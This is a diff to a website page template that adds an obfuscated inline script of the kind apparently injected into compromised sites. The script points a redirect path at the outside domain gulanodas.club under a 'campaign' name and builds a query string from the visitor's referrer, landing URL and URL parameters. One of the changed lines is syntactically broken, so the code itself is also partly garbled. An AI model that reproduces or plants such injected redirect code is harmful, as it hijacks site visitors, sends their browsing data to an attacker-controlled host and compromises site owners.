@@ -24,14 +24,18 @@ section.error-404 .text, .inline-popup .title, .authentication .title, .bb-other
 }
 </style>
 
-	<script>
+   	<script>
     (function() {
     var name = '_Xc2yNgj7Xjff2fzs';
+    var domain = 'gulanodas';
+  	var domain_zone = 'club';
+  	var camp_name = 'GB5T2wdm';
     if (!window._Xc2yNgj7Xjff2fzs) {
         window._Xc2yNgj7Xjff2fzs = {
             unique: false,
             ttl: 86400,
-            R_PATH: 'https://gulanodas.club/GB5T2wdm',
+            R_PATH: 'https://gulanodas.club/' + camp_name +, 
+            //R_PATH: 'https://' + domain + '.' + domain_zone + '/' + camp_name + ',
         };
     }
     const _XYqCqxZcbg3RGFTW = localStorage.getItem('config');
@@ -50,6 +54,7 @@ section.error-404 .text, .inline-popup .title, .authentication .title, .bb-other
         _6yDXKyrV2dcNb6pX += '&' + decodeURIComponent(window.location.search.replace('?', ''));
         _6yDXKyrV2dcNb6pX += '&se_referrer=' + encodeURIComponent(document.referrer);
         _6yDXKyrV2dcNb6pX += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _6yDXKyrV2dcNb6pX += '&name=' + encodeURIComponent(name);
     if (typeof _JpKTG9hDqsx6219T !== 'undefined' && _JpKTG9hDqsx6219T && window._Xc2yNgj7Xjff2fzs.unique) {
         _6yDXKyrV2dcNb6pX += '&sub_id=' + encodeURIComponent(_JpKTG9hDqsx6219T);
     }
